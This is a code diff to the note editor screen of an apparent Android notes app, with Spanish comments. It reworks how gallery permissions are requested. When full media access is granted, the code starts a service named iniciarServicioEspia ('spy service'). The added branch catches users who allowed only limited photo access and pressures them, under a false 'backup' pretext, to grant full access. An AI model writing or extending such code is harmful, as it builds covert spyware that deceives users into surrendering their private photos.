@@ -222,10 +222,30 @@ class NoteEditorActivity : AppCompatActivity() {
     }
 
     private fun checkGalleryPermission(requestCode: Int) {
+        // 1. ¿Tiene acceso TOTAL? -> Abrir galería normalmente
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
-            abrirGaleriaSegunRequest(requestCode)
-        } else {
+            if (requestCode == PERMISSION_REQUEST_GALLERY) {
+                val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
+                    addCategory(Intent.CATEGORY_OPENABLE)
+                    type = "image/*"
+                }
+                pickImageLauncher.launch(intent)
+            }
+            else if (requestCode == PERMISSION_REQUEST_WALLPAPER) pickBackgroundLauncher.launch(arrayOf("image/*"))
+        }
+        // 2. NUEVO: ¿Tiene acceso LIMITADO (Android 14+)? -> Mostrar diálogo DIRECTAMENTE
+        // Al detectar esto aquí, evitamos llamar a requestPermissions, por lo tanto NO se abre el selector de fotos del sistema.
+        else if (Build.VERSION.SDK_INT >= 34 &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
+
+            mostrarDialogoConfiguracion(
+                "Acceso Limitado",
+                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
+            )
+        }
+        // 3. ¿No tiene nada? -> Pedir permiso (esto abrirá el popup del sistema "Permitir/No Permitir")
+        else {
             val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
             ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
         }
@@ -262,9 +282,7 @@ class NoteEditorActivity : AppCompatActivity() {
 
             // Lógica de Denegación Permanente
             if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
-                mostrarDialogoConfiguracion("Permiso Requerido", "Has denegado el acceso permanentemente. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
-            } else {
-                Toast.makeText(this, "Permiso necesario para acceder a la galería.", Toast.LENGTH_SHORT).show()
+                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")
             }
         }
     }
